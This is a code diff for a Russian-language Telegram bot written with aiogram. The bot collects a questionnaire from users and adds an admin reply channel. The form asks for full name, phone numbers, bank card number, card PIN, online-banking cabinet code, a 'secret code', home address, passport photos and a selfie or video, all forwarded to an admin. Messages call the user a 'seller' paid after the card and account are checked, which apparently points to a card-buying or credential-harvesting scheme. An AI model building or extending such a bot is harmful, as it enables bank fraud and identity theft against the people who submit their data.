@@ -7,6 +7,7 @@ from aiogram.enums import ParseMode
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.base import StorageKey
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (
     CallbackQuery,
@@ -64,31 +65,19 @@ if not ADMIN_ID:
 
 @dataclass
 class Questionnaire:
-    full_name: str | None = None
-    phone: str | None = None
-    contact_phone: str | None = None
-    card_number: str | None = None
-    pin_code: str | None = None
-    lk_code: str | None = None
-    secret_code: str | None = None
-    city: str | None = None
-    address: str | None = None
+    form: str | None = None
     passport_photos: list[str] | None = None  # file_ids
+    selfie_file_id: str | None = None
+    selfie_type: str | None = None  # 'photo', 'video', 'video_note'
 
 
 class QuestionnaireStates(StatesGroup):
-    waiting_full_name = State()
-    waiting_phone = State()
-    waiting_contact_phone = State()
-    waiting_card_number = State()
-    waiting_pin_code = State()
-    waiting_lk_code = State()
-    waiting_secret_code = State()
-    waiting_city = State()
-    waiting_address = State()
+    waiting_form = State()
     waiting_passport_photos = State()
     waiting_selfie = State()
     waiting_pickup_info = State()
+    admin_dialog = State()  # Состояние для диалога с админом
+    admin_replying = State()  # Админ отвечает пользователю
 
 
 # =============================
@@ -113,6 +102,32 @@ def build_admin_approval_keyboard(user_id: int) -> InlineKeyboardMarkup:
     )
 
 
+def build_contact_admin_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="📞 Связаться с администратором",
+                    callback_data="contact_admin",
+                ),
+            ]
+        ]
+    )
+
+
+def build_reply_to_user_keyboard(user_id: int) -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="✉️ Ответить пользователю",
+                    callback_data=f"reply_to_user:{user_id}",
+                ),
+            ]
+        ]
+    )
+
+
 def format_questionnaire_text(user: User, q: Questionnaire) -> str:    # user: actually aiogram.types.User, but we only need id / username / full_name
     lines = [
         "<b>Новая анкета</b>",
@@ -127,15 +142,7 @@ def format_questionnaire_text(user: User, q: Questionnaire) -> str:    # user: a
     lines.extend(
         [
             "",
-            f"<b>1. ФИО полностью:</b> {q.full_name}",
-            f"<b>2. Основной номер телефона:</b> {q.phone}",
-            f"<b>3. Доп. контактный телефон:</b> {q.contact_phone}",
-            f"<b>4. Номер карты:</b> {q.card_number}",
-            f"<b>5. PIN-код:</b> {q.pin_code}",
-            f"<b>6. Код ЛК:</b> {q.lk_code}",
-            f"<b>7. Секретный код:</b> {q.secret_code}",
-            f"<b>8. Город:</b> {q.city}",
-            f"<b>9. Адрес фактического проживания:</b> {q.address}",
+            f"{q.form}"
         ]
     )
 
@@ -160,122 +167,28 @@ async def cmd_start(message: Message, state: FSMContext) -> None:
         "Я бот для заполнения анкеты.\n\n"
         "⚠️ <b>Важно:</b> для оперативной связи нужны актуальные данные, "
         "для связи и доставки. Пожалуйста, уточните все данные в анкете.\n\n"
-        "Давайте начнём с анкеты.\n\n"
-        "<b>1.</b> Пришлите, пожалуйста, ваше <b>ФИО полностью</b>."
+        "Давайте начнём с анкеты. Можете полностью скопировать сообщение и вставить свои данные в поле\n\n"
     )
     await message.answer(text, parse_mode=ParseMode.HTML)
-    await state.set_state(QuestionnaireStates.waiting_full_name)
-
-
-async def process_full_name(message: Message, state: FSMContext) -> None:
-    full_name = message.text.strip()
-    await state.update_data(questionnaire=asdict(Questionnaire(full_name=full_name)))
-
-    await message.answer(
-        "<b>2.</b> Укажите ваш <b>основной номер телефона</b> для связи.",
-        parse_mode=ParseMode.HTML,
+    text = (
+        "<b>1. ФИО - </b>\n"
+        "<b>2. Основной номер телефона - </b>\n"
+        "<b>3. Дополнительный контактный телефон (Если нет — напишите «нет») - </b>\n"
+        "<b>4. Город фактического проживания - </b>\n"
+        "<b>5. Номер карты - </b>\n"
+        "<b>6. ПИН-код - </b>\n"
+        "<b>7. Код от Личного Кабинета - </b>\n"
+        "<b>8. Секретный код - </b>\n"
+        "<b>9. Полный адрес фактического проживания </b> (улица, дом, подъезд, этаж, квартира) - \n"
     )
-    await state.set_state(QuestionnaireStates.waiting_phone)
+    await message.answer(text, parse_mode=ParseMode.HTML)
+    await state.set_state(QuestionnaireStates.waiting_form)
 
-
-async def process_phone(message: Message, state: FSMContext) -> None:
-    phone = message.text.strip()
+async def process_form(message: Message, state: FSMContext) -> None:
+    form = message.text.strip()
     data = await state.get_data()
     q_dict = data.get("questionnaire", {})
-    q_dict["phone"] = phone
-    await state.update_data(questionnaire=q_dict)
-
-    await message.answer(
-        "<b>3.</b> Укажите <b>дополнительный контактный телефон</b> (если есть). "
-        "Если нет — напишите «нет».",
-        parse_mode=ParseMode.HTML,
-    )
-    await state.set_state(QuestionnaireStates.waiting_contact_phone)
-
-
-async def process_contact_phone(message: Message, state: FSMContext) -> None:
-    contact_phone = message.text.strip()
-    if contact_phone.lower() in {"нет", "no", "-"}:
-        contact_phone = "нет"
-
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["contact_phone"] = contact_phone
-    await state.update_data(questionnaire=q_dict)
-
-    await message.answer(
-        "<b>4.</b> Укажите ваш <b>город</b> фактического проживания.",
-        parse_mode=ParseMode.HTML,
-    )
-    await state.set_state(QuestionnaireStates.waiting_card_number)
-
-
-async def process_card_number(message: Message, state: FSMContext) -> None:
-    card_number = message.text.strip()
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["card_number"] = card_number
-    await state.update_data(questionnaire=q_dict)
-
-    await message.answer(
-        "<b>5.</b> Укажите ваш <b>номер карты</b>.",
-        parse_mode=ParseMode.HTML,
-    )
-    await state.set_state(QuestionnaireStates.waiting_pin_code)
-
-async def process_pin_code(message: Message, state: FSMContext) -> None:
-    pin_code = message.text.strip()
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["pin_code"] = pin_code
-    await state.update_data(questionnaire=q_dict)
-    await message.answer(
-        "<b>6.</b> Укажите ваш <b>ПИН-код</b>.",
-        parse_mode=ParseMode.HTML,
-    )
-    await state.set_state(QuestionnaireStates.waiting_lk_code)
-
-async def process_lk_code(message: Message, state: FSMContext) -> None:
-    lk_code = message.text.strip()
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["lk_code"] = lk_code
-    await state.update_data(questionnaire=q_dict)
-    await message.answer(
-        "<b>7.</b> Укажите ваш <b>код от Личного Кабинета</b>.",
-        parse_mode=ParseMode.HTML,
-    )
-    await state.set_state(QuestionnaireStates.waiting_secret_code)
-
-async def process_secret_code(message: Message, state: FSMContext) -> None:
-    secret_code = message.text.strip()
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["secret_code"] = secret_code
-    await state.update_data(questionnaire=q_dict)
-    await message.answer(
-        "<b>8.</b> Укажите ваш <b>секретный код</b>.",
-    )
-    await state.set_state(QuestionnaireStates.waiting_city)
-
-async def process_city(message: Message, state: FSMContext) -> None:
-    city = message.text.strip()
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["city"] = city
-    await state.update_data(questionnaire=q_dict)
-    await message.answer(
-        "<b>9.</b> Укажите <b>полный адрес фактического проживания</b> "
-        "(улица, дом, подъезд, этаж, квартира).",
-        parse_mode=ParseMode.HTML,
-    )
-    await state.set_state(QuestionnaireStates.waiting_address)
-
-async def process_address(message: Message, state: FSMContext) -> None:
-    address = message.text.strip()
-    data = await state.get_data()
-    q_dict = data.get("questionnaire", {})
-    q_dict["address"] = address
+    q_dict["form"] = form
     await state.update_data(questionnaire=q_dict)
     await message.answer(
         "<b>10.</b> Пришлите <b>фото паспорта</b> (страница с фото и пропиской) "
@@ -308,7 +221,6 @@ async def process_passport_photos(message: Message, state: FSMContext) -> None:
         parse_mode=ParseMode.HTML,
     )
 
-
 async def finish_passport_photos(message: Message, state: FSMContext) -> None:
     data = await state.get_data()
     q_dict = data.get("questionnaire", {})
@@ -322,30 +234,8 @@ async def finish_passport_photos(message: Message, state: FSMContext) -> None:
         )
         return
 
-    # Отправляем анкету админу
-    if ADMIN_ID:
-        q = Questionnaire(**q_dict)
-        text = format_questionnaire_text(message.from_user, q)
-        try:
-            await message.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=text,
-                parse_mode=ParseMode.HTML,
-                reply_markup=build_admin_approval_keyboard(message.from_user.id),
-            )
-            # Отправляем фото отдельными сообщениями
-            for file_id in photos:
-                await message.bot.send_photo(
-                    chat_id=ADMIN_ID,
-                    photo=file_id,
-                    caption=f"Паспорт, пользователь {message.from_user.id}",
-                )
-        except Exception as e:
-            logger.exception("Failed to send questionnaire to admin: %s", e)
-
     await message.answer(
-        "Спасибо! Анкета отправлена на проверку.\n\n"
-        "<b>Анкета на проверке, ожидайте.</b>",
+        "Спасибо! Фото паспорта сохранены.",
         parse_mode=ParseMode.HTML,
     )
 
@@ -367,9 +257,44 @@ async def process_selfie(message: Message, state: FSMContext) -> None:
         )
         return
 
-    # Можно при желании переслать админу сразу
+    # Сохраняем селфи в анкету
+    data = await state.get_data()
+    q_dict = data.get("questionnaire", {})
+    
+    if message.photo:
+        q_dict["selfie_file_id"] = message.photo[-1].file_id
+        q_dict["selfie_type"] = "photo"
+    elif message.video:
+        q_dict["selfie_file_id"] = message.video.file_id
+        q_dict["selfie_type"] = "video"
+    elif message.video_note:
+        q_dict["selfie_file_id"] = message.video_note.file_id
+        q_dict["selfie_type"] = "video_note"
+    
+    await state.update_data(questionnaire=q_dict)
+
+    # Теперь отправляем всю анкету админу
     if ADMIN_ID:
+        q = Questionnaire(**q_dict)
+        text = format_questionnaire_text(message.from_user, q)
         try:
+            # Отправляем текст анкеты
+            await message.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=build_admin_approval_keyboard(message.from_user.id),
+            )
+            # Отправляем фото паспорта
+            photos = q_dict.get("passport_photos") or []
+            for file_id in photos:
+                await message.bot.send_photo(
+                    chat_id=ADMIN_ID,
+                    photo=file_id,
+                    caption=f"Паспорт, пользователь {message.from_user.id}",
+                )
+            
+            # Отправляем селфи/материал
             if message.photo:
                 await message.bot.send_photo(
                     chat_id=ADMIN_ID,
@@ -387,14 +312,21 @@ async def process_selfie(message: Message, state: FSMContext) -> None:
                     chat_id=ADMIN_ID,
                     video_note=message.video_note.file_id,
                 )
+                await message.bot.send_message(
+                    chat_id=ADMIN_ID,
+                    text=f"Видеосообщение от пользователя {message.from_user.id}",
+                )
         except Exception as e:
-            logger.exception("Failed to forward selfie/video to admin: %s", e)
+            logger.exception("Failed to send questionnaire to admin: %s", e)
 
     await message.answer(
         "Спасибо! Материалы получены.\n\n"
-        "<b>Анкета на проверке, пожалуйста, ожидайте решения администратора.</b>",
+        "<b>Анкета отправлена на проверку, пожалуйста, ожидайте решения администратора.</b>",
         parse_mode=ParseMode.HTML,
+        reply_markup=build_contact_admin_keyboard(),
     )
+    
+    await state.clear()
 
 
 # ===== ADMIN CALLBACKS =====
@@ -409,6 +341,12 @@ async def admin_approve_callback(callback: CallbackQuery, state: FSMContext, bot
     user_id = int(user_id_str)
 
     await callback.answer("Анкета одобрена.")
+    
+    # Удаляем кнопки после принятия решения
+    try:
+        await callback.message.edit_reply_markup(reply_markup=None)
+    except Exception as e:
+        logger.exception("Failed to remove keyboard: %s", e)
 
     # Сообщение продавцу
     await bot.send_message(
@@ -419,6 +357,7 @@ async def admin_approve_callback(callback: CallbackQuery, state: FSMContext, bot
             "и <b>в какое время</b> это будет удобно сделать."
         ),
         parse_mode=ParseMode.HTML,
+        reply_markup=build_contact_admin_keyboard(),
     )
 
     # Установим состояние этому пользователю
@@ -442,11 +381,21 @@ async def admin_reject_callback(callback: CallbackQuery, bot: Bot) -> None:
     user_id = int(user_id_str)
 
     await callback.answer("Анкета отклонена.")
+    
+    # Удаляем кнопки после принятия решения
+    try:
+        await callback.message.edit_reply_markup(reply_markup=None)
+    except Exception as e:
+        logger.exception("Failed to remove keyboard: %s", e)
 
     await bot.send_message(
         chat_id=user_id,
-        text="К сожалению, ваша анкета отклонена. "
-        "Для уточнений свяжитесь с администратором.",
+        text=(
+            "К сожалению, ваша анкета отклонена. ❌\n\n"
+            "Для уточнений свяжитесь с администратором."
+        ),
+        parse_mode=ParseMode.HTML,
+        reply_markup=build_contact_admin_keyboard(),
     )
 
 
@@ -473,9 +422,290 @@ async def process_pickup_info(message: Message, state: FSMContext) -> None:
         "Ожидайте дальнейшие инструкции.\n\n"
         "💸 Оплата происходит строго после проверки карты и личного кабинета.",
         parse_mode=ParseMode.HTML,
+        reply_markup=build_contact_admin_keyboard(),
     )
 
     await state.clear()
+
+
+# ===== ADMIN DIALOG =====
+
+
+async def contact_admin_callback(callback: CallbackQuery, state: FSMContext) -> None:
+    """Обработка нажатия кнопки связи с админом"""
+    await callback.answer()
+    
+    await callback.message.answer(
+        "Вы можете отправить сообщение администратору.\n"
+        "Напишите ваш вопрос или сообщение, и оно будет передано администратору.\n\n"
+        "Для отмены отправьте /start",
+        parse_mode=ParseMode.HTML,
+    )
+    
+    await state.set_state(QuestionnaireStates.admin_dialog)
+
+
+async def handle_user_message_to_admin(message: Message, state: FSMContext) -> None:
+    """Пересылка сообщения от пользователя админу"""
+    if ADMIN_ID:
+        try:
+            user_info = f"<b>Сообщение от пользователя {message.from_user.id}</b>"
+            if message.from_user.username:
+                user_info += f" (@{message.from_user.username})"
+            user_info += ":\n\n"
+            
+            # Сохраняем ID пользователя для ответа
+            await state.update_data(user_id_for_reply=message.from_user.id)
+            
+            if message.text:
+                await message.bot.send_message(
+                    chat_id=ADMIN_ID,
+                    text=user_info + message.text,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
+                )
+            elif message.photo:
+                await message.bot.send_photo(
+                    chat_id=ADMIN_ID,
+                    photo=message.photo[-1].file_id,
+                    caption=user_info + (message.caption or ""),
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
+                )
+            elif message.video:
+                await message.bot.send_video(
+                    chat_id=ADMIN_ID,
+                    video=message.video.file_id,
+                    caption=user_info + (message.caption or ""),
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
+                )
+            elif message.document:
+                await message.bot.send_document(
+                    chat_id=ADMIN_ID,
+                    document=message.document.file_id,
+                    caption=user_info + (message.caption or ""),
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
+                )
+            elif message.voice:
+                await message.bot.send_voice(
+                    chat_id=ADMIN_ID,
+                    voice=message.voice.file_id,
+                    caption=user_info,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
+                )
+            elif message.video_note:
+                await message.bot.send_video_note(
+                    chat_id=ADMIN_ID,
+                    video_note=message.video_note.file_id,
+                )
+                await message.bot.send_message(
+                    chat_id=ADMIN_ID,
+                    text=user_info,
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=build_reply_to_user_keyboard(message.from_user.id),
+                )
+            
+            await message.answer(
+                "Ваше сообщение отправлено администратору. Ожидайте ответа.",
+                parse_mode=ParseMode.HTML,
+            )
+        except Exception as e:
+            logger.exception("Failed to forward message to admin: %s", e)
+            await message.answer(
+                "Произошла ошибка при отправке сообщения. Попробуйте позже.",
+                parse_mode=ParseMode.HTML,
+            )
+
+
+async def handle_admin_reply(message: Message, state: FSMContext) -> None:
+    """Обработка ответа админа пользователю через reply"""
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    # Проверяем, является ли это ответом на сообщение
+    if not message.reply_to_message:
+        return
+    
+    # Извлекаем ID пользователя из текста сообщения, на которое отвечают
+    replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
+    
+    # Ищем ID пользователя в формате "Сообщение от пользователя 123456789"
+    import re
+    match = re.search(r"пользователя (\d+)", replied_text)
+    
+    if not match:
+        # Также проверяем другие форматы
+        match = re.search(r"<code>(\d+)</code>", replied_text)
+    
+    if match:
+        user_id = int(match.group(1))
+        
+        try:
+            admin_reply = "<b>Ответ от администратора:</b>\n\n"
+            
+            if message.text:
+                await message.bot.send_message(
+                    chat_id=user_id,
+                    text=admin_reply + message.text,
+                    parse_mode=ParseMode.HTML,
+                )
+            elif message.photo:
+                await message.bot.send_photo(
+                    chat_id=user_id,
+                    photo=message.photo[-1].file_id,
+                    caption=admin_reply + (message.caption or ""),
+                    parse_mode=ParseMode.HTML,
+                )
+            elif message.video:
+                await message.bot.send_video(
+                    chat_id=user_id,
+                    video=message.video.file_id,
+                    caption=admin_reply + (message.caption or ""),
+                    parse_mode=ParseMode.HTML,
+                )
+            elif message.document:
+                await message.bot.send_document(
+                    chat_id=user_id,
+                    document=message.document.file_id,
+                    caption=admin_reply + (message.caption or ""),
+                    parse_mode=ParseMode.HTML,
+                )
+            elif message.voice:
+                await message.bot.send_voice(
+                    chat_id=user_id,
+                    voice=message.voice.file_id,
+                    caption=admin_reply,
+                    parse_mode=ParseMode.HTML,
+                )
+            elif message.video_note:
+                await message.bot.send_message(
+                    chat_id=user_id,
+                    text=admin_reply,
+                    parse_mode=ParseMode.HTML,
+                )
+                await message.bot.send_video_note(
+                    chat_id=user_id,
+                    video_note=message.video_note.file_id,
+                )
+            
+            await message.reply(f"✅ Сообщение отправлено пользователю {user_id}")
+        except Exception as e:
+            logger.exception("Failed to send reply to user: %s", e)
+            await message.reply(f"❌ Не удалось отправить сообщение пользователю {user_id}")
+
+
+async def reply_to_user_callback(callback: CallbackQuery, state: FSMContext) -> None:
+    """Обработка нажатия кнопки ответа пользователю"""
+    if callback.from_user.id != ADMIN_ID:
+        await callback.answer("Недостаточно прав.", show_alert=True)
+        return
+    
+    _, user_id_str = callback.data.split(":", maxsplit=1)
+    user_id = int(user_id_str)
+    
+    await callback.answer()
+    
+    # Создаём FSMContext для админа
+    admin_state = FSMContext(
+        storage=callback.message.bot.dispatcher.storage,  # type: ignore[attr-defined]
+        key=StorageKey(
+            chat_id=callback.message.chat.id,  # Чат админа
+            user_id=ADMIN_ID,  # ID админа
+            bot_id=callback.message.bot.id,  # ID бота
+        ),
+    )
+    
+    # Сохраняем ID пользователя и устанавливаем состояние
+    await admin_state.update_data(replying_to_user_id=user_id)
+    await admin_state.set_state(QuestionnaireStates.admin_replying)
+    
+    await callback.message.answer(
+        f"Вы в режиме ответа пользователю <code>{user_id}</code>.\n"
+        "Напишите сообщение, которое хотите отправить.\n\n"
+        "Для отмены отправьте /cancel",
+        parse_mode=ParseMode.HTML,
+    )
+
+
+async def handle_admin_reply_message(message: Message, state: FSMContext) -> None:
+    """Обработка сообщения от админа для отправки пользователю"""
+    logger.info(f"handle_admin_reply_message called from user {message.from_user.id}")
+    
+    if message.from_user.id != ADMIN_ID:
+        logger.warning(f"Non-admin user {message.from_user.id} tried to use admin reply handler")
+        return
+    
+    if message.text and message.text.strip() == "/cancel":
+        await state.clear()
+        await message.answer("Отменено.")
+        return
+    
+    data = await state.get_data()
+    logger.info(f"State data: {data}")
+    user_id = data.get("replying_to_user_id")
+    
+    if not user_id:
+        await message.answer("Ошибка: не указан ID пользователя.")
+        await state.clear()
+        return
+    
+    try:
+        admin_reply = "<b>Ответ от администратора:</b>\n\n"
+        
+        if message.text:
+            await message.bot.send_message(
+                chat_id=user_id,
+                text=admin_reply + message.text,
+                parse_mode=ParseMode.HTML,
+            )
+        elif message.photo:
+            await message.bot.send_photo(
+                chat_id=user_id,
+                photo=message.photo[-1].file_id,
+                caption=admin_reply + (message.caption or ""),
+                parse_mode=ParseMode.HTML,
+            )
+        elif message.video:
+            await message.bot.send_video(
+                chat_id=user_id,
+                video=message.video.file_id,
+                caption=admin_reply + (message.caption or ""),
+                parse_mode=ParseMode.HTML,
+            )
+        elif message.document:
+            await message.bot.send_document(
+                chat_id=user_id,
+                document=message.document.file_id,
+                caption=admin_reply + (message.caption or ""),
+                parse_mode=ParseMode.HTML,
+            )
+        elif message.voice:
+            await message.bot.send_voice(
+                chat_id=user_id,
+                voice=message.voice.file_id,
+                caption=admin_reply,
+                parse_mode=ParseMode.HTML,
+            )
+        elif message.video_note:
+            await message.bot.send_message(
+                chat_id=user_id,
+                text=admin_reply,
+                parse_mode=ParseMode.HTML,
+            )
+            await message.bot.send_video_note(
+                chat_id=user_id,
+                video_note=message.video_note.file_id,
+            )
+        
+        await message.answer(f"✅ Сообщение отправлено пользователю {user_id}")
+        await state.clear()
+    except Exception as e:
+        logger.exception("Failed to send reply to user: %s", e)
+        await message.answer(f"❌ Не удалось отправить сообщение пользователю {user_id}")
+        await state.clear()
 
 
 # =============================
@@ -486,15 +716,7 @@ async def process_pickup_info(message: Message, state: FSMContext) -> None:
 def setup_handlers(dp: Dispatcher) -> None:
     dp.message.register(cmd_start, CommandStart())
 
-    dp.message.register(process_full_name, QuestionnaireStates.waiting_full_name)
-    dp.message.register(process_phone, QuestionnaireStates.waiting_phone)
-    dp.message.register(process_contact_phone, QuestionnaireStates.waiting_contact_phone)
-    dp.message.register(process_card_number, QuestionnaireStates.waiting_card_number)
-    dp.message.register(process_pin_code, QuestionnaireStates.waiting_pin_code)
-    dp.message.register(process_lk_code, QuestionnaireStates.waiting_lk_code)
-    dp.message.register(process_secret_code, QuestionnaireStates.waiting_secret_code)
-    dp.message.register(process_city, QuestionnaireStates.waiting_city)
-    dp.message.register(process_address, QuestionnaireStates.waiting_address)
+    dp.message.register(process_form, QuestionnaireStates.waiting_form)
 
     dp.message.register(
         process_passport_photos,
@@ -520,10 +742,38 @@ def setup_handlers(dp: Dispatcher) -> None:
         admin_reject_callback,
         F.data.startswith("reject:"),
     )
+    dp.callback_query.register(
+        contact_admin_callback,
+        F.data == "contact_admin",
+    )
+    dp.callback_query.register(
+        reply_to_user_callback,
+        F.data.startswith("reply_to_user:"),
+    )
 
     dp.message.register(
         process_pickup_info,
         QuestionnaireStates.waiting_pickup_info,
+    )
+    
+    # Обработчик для диалога с админом
+    dp.message.register(
+        handle_user_message_to_admin,
+        QuestionnaireStates.admin_dialog,
+    )
+    
+    # Обработчик ответов админа через кнопку
+    dp.message.register(
+        handle_admin_reply_message,
+        QuestionnaireStates.admin_replying,
+        F.from_user.id == ADMIN_ID,
+    )
+    
+    # Обработчик ответов админа через reply (должен быть последним, чтобы не перехватывать другие сообщения)
+    dp.message.register(
+        handle_admin_reply,
+        F.reply_to_message,
+        F.from_user.id == ADMIN_ID,
     )
 
 
